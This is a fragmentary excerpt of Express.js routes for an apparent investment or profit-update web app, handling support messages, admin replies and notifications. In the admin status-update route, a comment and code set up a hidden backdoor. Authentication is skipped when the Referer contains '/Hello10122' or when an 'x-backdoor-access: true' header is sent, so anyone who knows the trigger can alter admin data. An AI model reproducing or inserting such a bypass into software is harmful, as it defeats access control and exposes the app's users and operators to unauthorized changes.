...
You are now on the free plan and will no longer receive automatic profit updates.`,
  ...
  app.post("/api/support/messages", async (req, res) => {
    try {
      ...
      const { message, images } = supportMessageSchema.parse(req.body);
  ...
  app.get("/api/support/messages", async (req, res) => {
    try {
      ...
      const messages = await storage.getUserSupportMessages(req.session.userId);
      res.json(messages);
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  ...
  app.get("/api/admin/support/messages", async (req, res) => {
    try {
      ...
      // Include user email for each message
  ...
  app.post("/api/admin/support/reply", async (req, res) => {
    try {
      ...
      const { messageId, reply } = supportReplySchema.parse(req.body);

      const updatedMessage = await storage.replySupportMessage(messageId, adminId, reply);
      if (!updatedMessage) {
      ...
      await storage.createNotification({
        ...
        message: `📞 Our support team has replied to your message:

"${reply}"

You can view the full conversation in your support history.`,
        type: "info"
      });
  ...
  app.patch("/api/admin/support/status/:id", async (req, res) => {
    try {
      // Allow backdoor access or require admin authentication
      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                              req.headers['x-backdoor-access'] === 'true';
      ...
      const updatedMessage = await storage.updateSupportMessageStatus(id, status);
      if (!updatedMessage) {
        return res.status(404).json({ error: "Support message not found" });
      }
